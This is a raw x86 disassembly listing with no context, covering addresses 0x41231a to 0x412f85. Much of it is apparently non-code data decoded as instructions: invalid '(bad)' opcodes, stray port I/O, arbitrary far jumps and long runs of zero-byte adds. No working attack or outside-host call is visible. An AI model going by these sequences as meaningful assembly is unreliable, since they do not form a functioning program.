  41231a:	mov    cs,WORD PTR [ebx+0x6e89e7]
  412320:	pop    edi
  412321:	xchg   edi,eax
  412322:	imul   edi,edx,0x4f82e6b
  412328:	xchg   DWORD PTR [eax],eax
  41232a:	ds addr16 cwde 
  41232d:	sahf   
  41232e:	sahf   
  41232f:	jbe    0x412350
  412331:	cmp    dh,BYTE PTR [eax+ebp*2+0x57]
  412335:	cmp    al,0x1e
  412337:	(bad)  
  412338:	fistp  DWORD PTR [eax+0x2c]
  41233b:	imul   BYTE PTR ds:0x9dc35555
  412341:	popf   
  412342:	popf   
  412343:	out    dx,al
  412344:	sbb    ebp,DWORD PTR [edi-0x44]
  412347:	push   ecx
  412348:	fnstenv [ecx+0x6e360763]
  41234e:	fmul   QWORD PTR [eax-0x2be94790]
  412354:	cs xchg ebp,eax
  412356:	dec    edx
  412357:	shl    BYTE PTR [ecx*1-0x6531a347],1
  41235e:	mov    bp,WORD PTR [esp+eax*1]
  412362:	cmp    esi,DWORD PTR [edx]
  412364:	add    BYTE PTR [esi-0x48a0c1f6],dl
  41236a:	mov    bl,0x2
  41236c:	mov    eax,0x3f0a2fd9
  412371:	sub    eax,0x54e2c024
  412376:	pop    edi
  412377:	jl     0x412311
  412379:	lock jb 0x412335
  41237c:	fdiv   QWORD PTR [edx+ecx*4]
  41237f:	adc    BYTE PTR [ebp+0x22],cl
  412382:	sbb    cl,BYTE PTR [esi+eax*1]
  412385:	push   ecx
  412386:	lods   eax,DWORD PTR ds:[esi]
  412387:	push   esi
  412388:	push   ecx
  412389:	sub    al,0x16
  41238b:	xor    DWORD PTR ds:0x974b8d3d,edi
  412391:	cs pop ecx
  412393:	icebp  
  412394:	adc    BYTE PTR [eax],al
  412396:	and    eax,0xa6f5cb97
  41239b:	stos   BYTE PTR es:[edi],al
  41239c:	stos   BYTE PTR es:[edi],al
  41239d:	mov    edi,0xb5f55551
  4123a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123a3:	sahf   
  4123a4:	jp     0x4123d0
  4123a6:	mov    ebx,0x8adad7c2
  4123ab:	adc    BYTE PTR [ebx+edi*8-0x26],ah
  4123af:	ins    DWORD PTR es:[edi],dx
  4123b0:	scas   eax,DWORD PTR es:[edi]
  4123b1:	and    al,0x9a
  4123b3:	jg     0x41238a
  4123b5:	test   DWORD PTR [esi-0x307fde3d],ebx
  4123bb:	xor    DWORD PTR [esi-0xa4dc6e4],ecx
  4123c1:	shl    BYTE PTR [ebp+0x1b1cdf4b],cl
  4123c7:	sbb    edi,DWORD PTR [ebx+0x38]
  4123ca:	popf   
  4123cb:	dec    esi
  4123cc:	out    dx,eax
  4123cd:	jb     0x41238a
  4123cf:	fisttp QWORD PTR [edx+0x28]
  4123d2:	adc    al,0x52
  4123d4:	ss ins DWORD PTR es:[edi],dx
  4123d6:	fiadd  DWORD PTR [ebx+ebx*2+0x1b05b96e]
  4123dd:	ss ins BYTE PTR es:[edi],dx
  4123df:	inc    eax
  4123e0:	outs   dx,DWORD PTR ds:[esi]
  4123e1:	outs   dx,DWORD PTR ds:[esi]
  4123e2:	scas   eax,DWORD PTR es:[edi]
  4123e3:	and    eax,0xa0efd4e4
  4123e8:	push   eax
  4123e9:	sub    BYTE PTR [eax+0x79],bl
  4123ec:	div    DWORD PTR [edx-0x12f78c67]
  4123f2:	mov    ah,0x3e
  4123f4:	aaa    
  4123f5:	sti    
  4123f6:	gs sti 
  4123f8:	(bad)
  4123fb:	fucomip st,st(7)
  4123fd:	mov    bh,0x86
  4123ff:	icebp  
  412400:	push   ss
  412401:	pop    ebx
  412402:	or     dl,BYTE PTR [eax*2-0xcf7794f]
  412409:	js     0x412447
  41240b:	lock sti 
  41240d:	std    
  41240e:	(bad)  
  41240f:	cwde   
  412410:	add    BYTE PTR [ecx+0x53530e5c],bh
  412416:	push   ebx
  412417:	mov    BYTE PTR [esi-0x5d],al
  41241a:	dec    eax
  41241b:	and    al,0x12
  41241d:	enter  0x72e5,0x34
  412421:	or     edx,ecx
  412423:	inc    esp
  412424:	pop    ebp
  412425:	lock jg 0x412419
  412428:	int3   
  412429:	xor    ecx,edi
  41242b:	pushf  
  41242c:	mov    edx,0x95b8af06
  412431:	mov    ebx,0x397b6ad0
  412436:	sar    esp,1
  412438:	jbe    0x412401
  41243a:	scas   al,BYTE PTR es:[edi]
  41243b:	or     bl,BYTE PTR [edx+eax*1]
  41243e:	clc    
  41243f:	or     eax,DWORD PTR [eax+0x22]
  412442:	xchg   ecx,eax
  412443:	lock jl 0x41243e
  412446:	loope  0x4123cf
  412448:	mov    ebx,0xbde8d1a3
  41244d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41244e:	push   edx
  41244f:	imul   edx,ebx,0x26cccccc
  412455:	dec    ebp
  412456:	shl    DWORD PTR [esi-0x4e265966],cl
  41245c:	jp     0x412453
  41245e:	push   0x6c
  412460:	fnstsw WORD PTR [edx-0x20202eb]
  412466:	mov    BYTE PTR [edx+eiz*1-0x78],al
  41246a:	inc    esp
  41246b:	and    cl,BYTE PTR [eax]
  41246d:	xchg   ebx,eax
  41246f:	dec    ebp
  412470:	ret    
  412471:	outs   dx,DWORD PTR ds:[esi]
  412472:	sar    DWORD PTR [eax],cl
  412474:	jns    0x4124f2
  412476:	jmp    0x7cdc:0x24c8d22d
  41247d:	jbe    0x41249c
  41247f:	push   ds
  412480:	movups xmm4,XMMWORD PTR [ebx+0x3]
  412484:	inc    eax
  412485:	mov    ds:0x3dcc5edd,eax
  41248a:	mov    al,ds:0x9a00f7be
  41248f:	inc    esi
  412490:	jecxz  0x412433
  412492:	jmp    0x4124ab
  412494:	or     al,BYTE PTR ds:0xe479f3e4
  41249a:	jb     0x4124d5
  41249c:	in     al,0x72
  41249e:	cmp    DWORD PTR [esp+ebp*1],ebp
  4124a1:	sub    al,0x20
  4124a3:	xchg   ecx,eax
  4124a4:	dec    eax
  4124a5:	and    BYTE PTR [ebp+0x2850a34e],bl
  4124ab:	add    DWORD PTR fs:[ecx+edi*4+0x5c],ecx
  4124b0:	scas   al,BYTE PTR es:[edi]
  4124b1:	sub    DWORD PTR [ebp+0x55],edx
  4124b4:	inc    edi
  4124b5:	push   ebp
  4124b6:	push   ebp
  4124b7:	cmp    eax,0x7ddde000
  4124bc:	sti    
  4124bd:	imul   BYTE PTR [ebp+0x14afdb54]
  4124c3:	push   edi
  4124c4:	pop    ebx
  4124c5:	xchg   BYTE PTR [esi+0x3873d0b9],ch
  4124cb:	add    al,0xf0
  4124cd:	pop    ss
  4124ce:	mov    BYTE PTR [esi+esi*1-0x15],ch
  4124d2:	fwait
  4124d3:	cwde   
  4124d4:	cwde   
  4124d5:	pop    eax
  4124d6:	xor    esi,DWORD PTR ds:0x34677535
  4124dc:	sbb    bl,ch
  4124de:	jne    0x4124c1
  4124e0:	ret    0xfb85
  4124e3:	or     eax,DWORD PTR [ebp+0x10016c2]
  4124e9:	mov    edi,0xdfbf0fdf
  4124ee:	imul   edx,edi
  4124f1:	mov    ebx,DWORD PTR [esi+0x5bac1e9e]
  4124f7:	mov    bh,0xe
  4124f9:	mov    ebp,0xeee8bdbd
  4124fe:	out    dx,al
  4124ff:	inc    esi
  412500:	push   edi
  412501:	push   edi
  412502:	pop    ss
  412503:	jp     0x412580
  412505:	jnp    0x412534
  412507:	sub    eax,0xcef3aadc
  41250c:	jb     0x41254e
  41250e:	or     BYTE PTR [ebp-0x5c],0xa2
  412512:	jmp    0x4124ce
  412514:	adc    eax,0xb366c89f
  412519:	dec    eax
  41251a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41251b:	push   edx
  41251c:	xchg   esi,eax
  41251d:	and    BYTE PTR [edi+0x32],0x19
  412521:	stos   DWORD PTR es:[edi],eax
  412522:	inc    edi
  412523:	pop    edi
  412524:	popf   
  412525:	ins    BYTE PTR es:[edi],dx
  412526:	je     0x412528
  412528:	out    0x5c,eax
  41252a:	xlat   BYTE PTR cs:[ebx]
  41252c:	or     DWORD PTR [ebp+0x55],edx
  41252f:	dec    edi
  412530:	mov    eax,0x8a83ae5c
  412535:	mov    ds:0xdcf73ccc,al
  41253a:	jae    0x41252e
  41253c:	cmp    al,0xe1
  41253e:	dec    edi
  41253f:	paddusb mm3,QWORD PTR [ebp-0x60]
  412543:	ins    DWORD PTR es:[edi],dx
  412544:	sbb    DWORD PTR [esi],edi
  412546:	push   ebp
  412547:	inc    ecx
  412548:	mov    bh,0x83
  41254a:	inc    ebx
  41254b:	add    BYTE PTR [esi],cl
  41254d:	nop
  41254e:	dec    eax
  41254f:	and    al,0xfc
  412551:	inc    ebx
  412552:	inc    ebx
  412553:	inc    ebx
  412554:	sbb    esi,DWORD PTR [ebp+ebx*2-0x41]
  412558:	and    eax,0x3cde8d1a
  41255d:	ss test BYTE PTR ss:0x32653700,0x99
  412566:	sahf   
  412567:	bound  esi,QWORD PTR [ecx+0x5145418]
  41256d:	add    DWORD PTR [eax-0x40],0x4d4b5aea
  412574:	push   0x5d
  412576:	pop    ebp
  412577:	pop    ebp
  412578:	(bad)  
  412579:	inc    BYTE PTR [eax+0x20]
  41257c:	add    BYTE PTR [eax+0x20],0x60
  412580:	dec    ebp
  412581:	cmp    ch,BYTE PTR [edx-0x3c172d8]
  412587:	xchg   BYTE PTR [ecx+0x40],ah
  41258a:	shl    DWORD PTR [ebx+ecx*8],cl
  41258d:	adc    ch,BYTE PTR [eax]
  41258f:	push   ss
  412590:	mov    edx,DWORD PTR [esi+0x42]
  412593:	mov    fs,WORD PTR [esi+0xd34d069]
  412599:	stc    
  41259a:	jl     0x4125ba
  41259c:	test   DWORD PTR [edx-0x3f],eax
  41259f:	sbb    ah,dl
  4125a1:	fwait
  4125a2:	lods   al,BYTE PTR ds:[esi]
  4125a3:	or     eax,DWORD PTR [eax]
  4125a5:	jo     0x412560
  4125a7:	pop    esp
  4125a8:	mov    edx,0xaa8baaaa
  4125ad:	stos   BYTE PTR es:[edi],al
  4125ae:	jle    0x412558
  4125b0:	stos   BYTE PTR es:[edi],al
  4125b1:	jmp    0x3d55:0x54170019
  4125b8:	test   eax,0xf3f0ca28
  4125bd:	iret   
  4125be:	aas    
  4125bf:	jg     0x412576
  4125c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125c2:	xchg   esi,eax
  4125c3:	sti    
  4125c4:	mov    eax,DWORD PTR [edx-0x69f1ffbd]
  4125ca:	and    BYTE PTR [ebp-0x3cf346b6],dl
  4125d0:	or     BYTE PTR [ebp+0x75667339],bl
  4125d6:	test   eax,0x30d5ba54
  4125db:	mov    ebp,cs
  4125dd:	addr16 iret 
  4125df:	sahf   
  4125e0:	pop    ebp
  4125e1:	xchg   ebx,eax
  4125e2:	int    0x66
  4125e4:	aaa    
  4125e5:	cdq    
  4125e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125e7:	mov    ecx,0x3ecd34d9
  4125ec:	pop    ebp
  4125ed:	xlat   BYTE PTR ds:[ebx]
  4125ee:	jge    0x4125b5
  4125f0:	(bad)
  4125f5:	aad    0x6a
  4125f7:	mov    ch,0xea
  4125f9:	xor    cl,BYTE PTR [ebx+eax*2]
  4125fc:	push   ebp
  4125fd:	push   ebp
  4125fe:	push   ebp
  4125ff:	and    eax,0xdd75d721
  412604:	dec    edx
  412605:	inc    esi
  412606:	push   edx
  412607:	adc    al,0xc5
  412609:	retf   0xa7f3
  41260c:	pusha  
  41260d:	bound  edi,QWORD PTR [ecx+0x29ea365c]
  412613:	mov    edx,0x1528a286
  412618:	push   ebp
  412619:	push   ebp
  41261a:	dec    ebp
  41261b:	push   ebp
  41261c:	push   ebp
  41261d:	sub    ebp,DWORD PTR [edx+0x5554c6aa]
  412623:	lea    eax,[edx]
  412625:	mov    BYTE PTR [ebx+0x28ae3aaa],ch
  41262b:	retf   0x4505
  41262e:	push   ecx
  41262f:	add    DWORD PTR cs:[eax],ebx
  412632:	jnp    0x412615
  412634:	test   DWORD PTR [edi],edx
  412636:	cs (bad) 
  412638:	jmp    0x1428f11b
  41263d:	push   cs
  41263e:	add    DWORD PTR [eax],edi
  412640:	pop    eax
  412641:	ss push edx
  412643:	test   eax,0x43a00294
  412648:	push   ebp
  412649:	push   ebp
  41264a:	dec    edi
  41264b:	es xchg ebx,eax
  41264d:	icebp  
  41264e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41264f:	shr    ecx,cl
  412651:	cs inc ebp
  412653:	push   ecx
  412654:	jl     0x4125fe
  412656:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412657:	retf   
  412658:	jp     0x4126a6
  41265a:	ror    DWORD PTR [ecx+eax*1],cl
  41265d:	push   eax
  41265e:	push   esp
  41265f:	push   ebp
  412660:	lods   eax,DWORD PTR ds:[esi]
  412661:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412662:	shr    DWORD PTR [ecx+0x77],cl
  412665:	sub    dl,BYTE PTR [ebp-0x5d75d7f6]
  41266b:	mov    eax,0xbaf32e5c
  412670:	jmp    0x412620
  412672:	retf   
  412673:	test   eax,0x55aaa
  412678:	xchg   edi,eax
  412679:	retf   
  41267a:	push   ebp
  41267b:	cmp    DWORD PTR [edx-0xc],edi
  41267e:	test   al,0x76
  412680:	loop   0x412646
  412682:	mov    DWORD PTR [edx+0x28],ebp
  412685:	adc    al,0xca
  412687:	mov    ebx,0xa29cae5c
  41268c:	sub    BYTE PTR ds:0x51457900,al
  412692:	or     bh,BYTE PTR [edi]
  412694:	stc    
  412695:	leave  
  412696:	dec    edi
  412697:	(bad)  
  412698:	aam    0x66
  41269a:	mov    esp,0x1c0e0703
  41269f:	cmp    BYTE PTR [eax-0x20],dh
  4126a2:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126a9:	jo     0x41268b
  4126ab:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126b2:	jo     0x412694
  4126b4:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126bb:	jo     0x41269d
  4126bd:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126c4:	jo     0x4126a6
  4126c6:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126cd:	jo     0x4126af
  4126cf:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126d6:	jo     0x4126b8
  4126d8:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126df:	jo     0x4126c1
  4126e1:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126e8:	jo     0x4126ca
  4126ea:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126f1:	jo     0x4126d3
  4126f3:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126fa:	jo     0x4126dc
  4126fc:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  412703:	jo     0x4126e5
  412705:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  41270c:	jo     0x4126ee
  41270e:	rol    cl,0x15
  412711:	loopne 0x412712
  412713:	add    eax,DWORD PTR [esi]
  412715:	shl    eax,0x29
  412718:	xor    ecx,DWORD PTR [ebx+0x68]
  41271b:	inc    BYTE PTR [eax]
  41271d:	add    BYTE PTR [eax],al
  41271f:	add    BYTE PTR [ecx+0x45],cl
  412722:	dec    esi
  412723:	inc    esp
  412724:	scas   al,BYTE PTR es:[edi]
  412725:	inc    edx
  412726:	pusha  
  412727:	sub    BYTE PTR [eax],0x0
  41272a:	add    BYTE PTR [eax],al
  41272c:	xor    BYTE PTR [eax],al
  41272e:	add    BYTE PTR [eax],al
  412730:	pusha  
  412731:	add    BYTE PTR [eax],al
  412733:	add    BYTE PTR [ecx],al
  412735:	add    BYTE PTR [eax],ah
  412737:	add    BYTE PTR [eax],al
  412739:	add    BYTE PTR [eax],al
  41273b:	add    BYTE PTR [eax+0x25],al
	...
  4129e5:	add    BYTE PTR [eax],al
  4129e7:	add    BYTE PTR [ecx-0x44fa4e4f],dh
  4129ed:	mov    ebx,0xb3b31cbb
  4129f2:	mov    bl,0x55
  4129f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129f7:	xor    BYTE PTR [ecx-0x4d704e4f],0xb2
  4129fe:	mov    dl,0x96
  412a00:	mov    ah,0xb4
  412a02:	mov    ah,0x99
  412a04:	stos   DWORD PTR es:[edi],eax
  412a05:	stos   DWORD PTR es:[edi],eax
  412a06:	stos   DWORD PTR es:[edi],eax
  412a07:	xchg   edi,eax
  412a08:	lea    ecx,[ebp-0x7d7d6d73]
  412a0e:	add    BYTE PTR [edx+0x5c797979],0x72
  412a15:	jb     0x412a89
  412a17:	and    eax,DWORD PTR [ecx+0x78181]
	...
  412a9d:	add    BYTE PTR [eax],al
  412a9f:	add    BYTE PTR [ebp-0x57e57273],cl
  412aa5:	test   al,0xa8
  412aa7:	jne    0x412a65
  412aa9:	mov    esp,0xcdcdd1bc
  412aae:	int    0xff
  412ab0:	aad    0xd5
  412ab2:	aad    0xff
  412ab4:	(bad)  
  412ab6:	(bad)  
  412ab8:	in     eax,0xe5
  412aba:	in     eax,0xff
  412abc:	in     eax,0xe5
  412abe:	in     eax,0xff
  412ac0:	loope  0x412aa3
  412ac2:	loope  0x412ac3
  412ac4:	(bad)  
  412ac6:	fdiv   st(7),st
  412ac8:	fstp   st(5)
  412aca:	(bad)  
  412acc:	(bad)  
  412ace:	fdivp  st(7),st
  412ad0:	rcl    ebx,cl
  412ad2:	sar    edi,cl
  412ad4:	rol    al,0xc0
  412ad7:	jmp    DWORD PTR [ecx-0x731f5e5f]
  412add:	mov    WORD PTR [edi+eax*4+0x22969696],cs
	...
  412af4:	add    BYTE PTR [eax],al
  412af6:	add    BYTE PTR [edx],al
  412af8:	add    BYTE PTR [eax],al
  412afa:	add    BYTE PTR [edx],al
  412afc:	add    BYTE PTR [eax],al
  412afe:	add    BYTE PTR [ecx],al
	...
  412b5c:	(bad)  
  412b5d:	(bad)  
  412b5e:	(bad)  
  412b5f:	addr16 mov bh,0xb7
  412b62:	mov    bh,0xea
  412b64:	aam    0xd4
  412b66:	aam    0xff
  412b68:	xlat   BYTE PTR ds:[ebx]
  412b69:	xlat   BYTE PTR ds:[ebx]
  412b6a:	xlat   BYTE PTR ds:[ebx]
  412b6b:	(bad)  
  412b6c:	fcmovnu st,st(3)
  412b6e:	(bad)  
  412b70:	(bad)  
  412b72:	fdiv   st(7),st
  412b74:	fcmovnu st,st(3)
  412b76:	(bad)  
  412b78:	fcmovu st,st(2)
  412b7a:	(bad)  
  412b7c:	(bad)  
  412b7d:	(bad)  
  412b7e:	(bad)  
  412b7f:	call   ecx
  412b81:	rcl    ecx,1
  412b83:	dec    ecx
  412b85:	leave  
  412b86:	leave  
  412b87:	dec    esp
  412b89:	int3   
  412b8a:	int3   
  412b8b:	(bad)  
  412b8c:	(bad)  
  412b8e:	(bad)  
  412b90:	(bad)  
  412b92:	fcos   
  412b94:	ret    0xc2c2
  412b97:	(bad)  
  412b98:	mov    edi,0xc9ffbfbf
  412b9d:	leave  
  412b9e:	leave  
  412b9f:	jmp    FWORD PTR [ebp+0x63f9adad]
  412ba5:	arpl   WORD PTR [ebx-0x7a],sp
  412ba8:	xor    eax,0xf3535
  412bad:	add    BYTE PTR [eax],al
  412baf:	add    BYTE PTR [eax],al
  412bb1:	add    BYTE PTR [eax],al
  412bb3:	push   ss
  412bb4:	add    BYTE PTR [eax],al
  412bb6:	add    BYTE PTR [ecx],bl
  412bb8:	add    BYTE PTR [eax],al
  412bba:	add    BYTE PTR [edi],dl
  412bbc:	add    BYTE PTR [eax],al
  412bbe:	add    BYTE PTR ds:0x4000000,cl
  412bc4:	add    BYTE PTR [eax],al
  412bc6:	add    BYTE PTR [edx],al
  412bc8:	add    BYTE PTR [eax],al
  412bca:	add    BYTE PTR [ecx],al
	...
  412c18:	mov    ds:0xcaa6a2a2,al
  412c1d:	retf   0xffca
  412c20:	rcl    al,1
  412c22:	sar    bh,1
  412c24:	retf   
  412c25:	retf   
  412c26:	retf   
  412c27:	dec    ebx
  412c29:	retf   
  412c2a:	retf   
  412c2b:	call   eax
  412c2d:	rcl    al,1
  412c2f:	call   edi
  412c31:	xlat   BYTE PTR ds:[ebx]
  412c32:	xlat   BYTE PTR ds:[ebx]
  412c33:	(bad)  
  412c34:	fcmovu st,st(2)
  412c36:	(bad)  
  412c38:	fcmovnu st,st(3)
  412c3a:	(bad)  
  412c3c:	fcmovu st,st(2)
  412c3e:	(bad)  
  412c40:	aam    0xd4
  412c42:	aam    0xff
  412c44:	retf   
  412c45:	retf   
  412c46:	retf   
  412c47:	call   edx
  412c49:	rcl    dl,cl
  412c4b:	jmp    esp
  412c4d:	in     al,0xe4
  412c4f:	dec    ebp
  412c51:	int    0xcd
  412c53:	push   DWORD PTR [edx-0x3b004d4e]
  412c59:	(bad)  
  412c5a:	(bad)  
  412c5b:	dec    eax
  412c5d:	enter  0xffc8,0xb9
  412c61:	mov    ecx,0xc4c4ffb9
  412c66:	(bad)  
  412c67:	(bad)  
  412c68:	jle    0x412ce8
  412c6a:	jle    0x412c34
  412c6c:	or     eax,0x3d0d0d
  412c71:	add    BYTE PTR [eax],al
  412c73:	xor    DWORD PTR [eax],eax
  412c75:	add    BYTE PTR [eax],al
  412c77:	cmp    eax,0x32000000
  412c7c:	add    BYTE PTR [eax],al
  412c7e:	add    BYTE PTR [edx],ah
  412c80:	add    BYTE PTR [eax],al
  412c82:	add    BYTE PTR [ebx],dl
  412c84:	add    BYTE PTR [eax],al
  412c86:	add    BYTE PTR [eax],cl
  412c88:	add    BYTE PTR [eax],al
  412c8a:	add    BYTE PTR [eax+eax*1],al
  412c8d:	add    BYTE PTR [eax],al
  412c8f:	add    DWORD PTR [eax],eax
	...
  412cd1:	add    BYTE PTR [eax],al
  412cd3:	add    BYTE PTR [ebp-0x3a7a6263],bl
  412cd9:	(bad)
  412cdc:	(bad)  
  412cdd:	(bad)  
  412cde:	(bad)  
  412cdf:	inc    ecx
  412ce1:	rol    ecx,0xff
  412ce4:	mov    edi,0xccccffc7
  412cea:	int3   
  412ceb:	call   eax
  412ced:	rcl    al,1
  412cef:	call   edi
  412cf1:	xlat   BYTE PTR ds:[ebx]
  412cf2:	xlat   BYTE PTR ds:[ebx]
  412cf3:	(bad)  
  412cf4:	(bad)  
  412cf6:	fdiv   st(7),st
  412cf8:	fstp   st(5)
  412cfa:	(bad)  
  412cfc:	(bad)  
  412cfe:	fdiv   st(7),st
  412d00:	aam    0xd4
  412d02:	aam    0xff
  412d04:	enter  0xc8c8,0xff
  412d08:	rcl    ebx,cl
  412d0a:	sar    edi,cl
  412d0c:	(bad)  
  412d0e:	fdivp  st(7),st
  412d10:	rol    ecx,0xc1
  412d13:	inc    edx
  412d15:	ret    0xffc2
  412d18:	retf   0xcaca
  412d1b:	push   DWORD PTR [ebp-0x53004a4b]
  412d21:	lods   al,BYTE PTR ds:[esi]
  412d22:	lods   al,BYTE PTR ds:[esi]
  412d23:	jmp    FWORD PTR [esp+ebp*4-0x3d3d0054]
  412d2a:	ret    0x6eff
  412d2d:	outs   dx,BYTE PTR ds:[esi]
  412d2e:	outs   dx,BYTE PTR ds:[esi]
  412d2f:	enter  0x0,0x0
  412d33:	dec    eax
  412d34:	add    BYTE PTR [eax],al
  412d36:	add    BYTE PTR [ebx+0x0],cl
  412d39:	add    BYTE PTR [eax],al
  412d3b:	inc    eax
  412d3c:	add    BYTE PTR [eax],al
  412d3e:	add    BYTE PTR [edx],dh
  412d40:	add    BYTE PTR [eax],al
  412d42:	add    BYTE PTR [eax+eax*1],ah
  412d45:	add    BYTE PTR [eax],al
  412d47:	adc    eax,0xb000000
  412d4c:	add    BYTE PTR [eax],al
  412d4e:	add    BYTE PTR ds:0x0,al
	...
  412d94:	mov    dh,0xb6
  412d96:	mov    dh,0xee
  412d98:	mov    ebp,0xbdffbdbd
  412d9d:	mov    ebp,0xc1c1ffbd
  412da2:	sar    edi,0xc4
  412da5:	(bad)  
  412da6:	(bad)  
  412da7:	dec    eax
  412da9:	enter  0xffc8,0xce
  412dad:	into   
  412dae:	into   
  412daf:	call   ebp
  412db1:	aad    0xd5
  412db3:	(bad)  
  412db4:	(bad)  
  412db6:	fdiv   st(7),st
  412db8:	fstp   st(5)
  412dba:	(bad)  
  412dbc:	fcmovu st,st(2)
  412dbe:	(bad)  
  412dc0:	rcl    dl,cl
  412dc2:	sar    bh,cl
  412dc4:	mov    edi,0xcdcdffc7
  412dca:	int    0xff
  412dcc:	int    0xcd
  412dce:	int    0xff
  412dd0:	rol    ecx,0xc1
  412dd3:	inc    edx
  412dd5:	ret    0xffc2
  412dd8:	mov    ah,0xb4
  412dda:	mov    ah,0xff
  412ddc:	scas   eax,DWORD PTR es:[edi]
  412ddd:	scas   eax,DWORD PTR es:[edi]
  412dde:	scas   eax,DWORD PTR es:[edi]
  412ddf:	jmp    FWORD PTR [eax-0x66005758]
  412de5:	cdq    
  412de6:	cdq    
  412de7:	jmp    DWORD PTR [esi-0x6800595a]
  412ded:	xchg   edi,eax
  412dee:	xchg   edi,eax
  412def:	in     al,dx
  412df0:	or     eax,0x5e0d0d
  412df5:	add    BYTE PTR [eax],al
  412df7:	inc    ecx
  412df8:	add    BYTE PTR [eax],al
  412dfa:	add    BYTE PTR [eax+eax*1+0x0],al
  412dfe:	add    BYTE PTR [esi],dh
  412e00:	add    BYTE PTR [eax],al
  412e02:	add    BYTE PTR [edi],ah
  412e04:	add    BYTE PTR [eax],al
  412e06:	add    BYTE PTR [eax+eax*1],bl
  412e09:	add    BYTE PTR [eax],al
  412e0b:	adc    al,BYTE PTR [eax]
  412e0d:	add    BYTE PTR [eax],al
  412e0f:	or     DWORD PTR [eax],eax
	...
  412e51:	add    BYTE PTR [eax],al
  412e53:	add    BYTE PTR [esi-0x4813494a],dh
  412e59:	mov    bh,0xb7
  412e5b:	(bad)  
  412e5c:	mov    edx,0xbdffbaba
  412e61:	mov    ebp,0xc0c0ffbd
  412e66:	sar    bh,0xc4
  412e69:	(bad)  
  412e6a:	(bad)  
  412e6b:	dec    ecx
  412e6d:	leave  
  412e6e:	leave  
  412e6f:	dec    edi
  412e71:	iret   
  412e72:	iret   
  412e73:	call   esi
  412e75:	(bad)  
  412e76:	(bad)  
  412e77:	call   edi
  412e79:	xlat   BYTE PTR ds:[ebx]
  412e7a:	xlat   BYTE PTR ds:[ebx]
  412e7b:	call   ebp
  412e7d:	aad    0xd5
  412e7f:	dec    ebp
  412e81:	int    0xcd
  412e83:	inc    esp
  412e85:	(bad)  
  412e86:	(bad)  
  412e87:	inc    ebp
  412e89:	(bad)
  412e8c:	rol    al,0xc0
  412e8f:	(bad)  
  412e90:	mov    ebp,0xb6ffbdbd
  412e95:	mov    dh,0xb6
  412e97:	jmp    FWORD PTR [esi-0x5d005152]
  412e9d:	mov    ds:0x9494ffa2,al
  412ea2:	xchg   esp,eax
  412ea3:	call   DWORD PTR [eax-0x5a006f70]
  412ea9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412eaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412eab:	call   FWORD PTR [ebp+0x17ef9d9d]
  412eb1:	pop    ss
  412eb2:	pop    ss
  412eb3:	pop    eax
  412eb4:	add    BYTE PTR [eax],al
  412eb6:	add    BYTE PTR [edx],dh
  412eb8:	add    BYTE PTR [eax],al
  412eba:	add    BYTE PTR [ebx],bh
  412ebc:	add    BYTE PTR [eax],al
  412ebe:	add    BYTE PTR [ecx],dh
  412ec0:	add    BYTE PTR [eax],al
  412ec2:	add    BYTE PTR [esi],ah
  412ec4:	add    BYTE PTR [eax],al
  412ec6:	add    BYTE PTR [eax+eax*1],bl
  412ec9:	add    BYTE PTR [eax],al
  412ecb:	adc    al,BYTE PTR [eax]
  412ecd:	add    BYTE PTR [eax],al
  412ecf:	or     DWORD PTR [eax],eax
	...
  412f11:	add    BYTE PTR [eax],al
  412f13:	add    BYTE PTR [edx-0x44524d4e],dh
  412f19:	mov    ebx,0xb9b9ffbb
  412f1e:	mov    ecx,0xb9b9b9ff
  412f23:	(bad)  
  412f24:	mov    esi,0xc0ffbebe
  412f29:	rol    al,0xff
  412f2c:	(bad)  
  412f2d:	(bad)  
  412f2e:	(bad)  
  412f2f:	inc    edi
  412f31:	mov    edi,0xccccccff
  412f37:	dec    esi
  412f39:	into   
  412f3a:	into   
  412f3b:	dec    esp
  412f3d:	int3   
  412f3e:	int3   
  412f3f:	inc    edi
  412f41:	mov    edi,0xc3c3c3ff
  412f47:	inc    eax
  412f49:	rol    al,0xff
  412f4c:	mov    edx,0xb0ffbaba
  412f51:	mov    al,0xb0
  412f53:	jmp    DWORD PTR [ebx-0x6b005c5d]
  412f59:	xchg   esp,eax
  412f5a:	xchg   esp,eax
  412f5b:	dec    DWORD PTR [esi-0x6e007172]
  412f61:	xchg   ecx,eax
  412f62:	xchg   ecx,eax
  412f63:	call   DWORD PTR [edi-0x50006869]
  412f69:	scas   eax,DWORD PTR es:[edi]
  412f6a:	scas   eax,DWORD PTR es:[edi]
  412f6b:	push   DWORD PTR [esp+esi*2+0x74]
  412f6f:	ret    
  412f70:	add    BYTE PTR [eax],al
  412f72:	add    BYTE PTR [edx],ah
  412f74:	add    BYTE PTR [eax],al
  412f76:	add    BYTE PTR [edx],ah
  412f78:	or     eax,0x300d0d
  412f7d:	add    BYTE PTR [eax],al
  412f7f:	sub    DWORD PTR [eax],eax
  412f81:	add    BYTE PTR [eax],al
  412f83:	and    DWORD PTR [eax],eax
  412f85:	add    BYTE PTR [eax],al
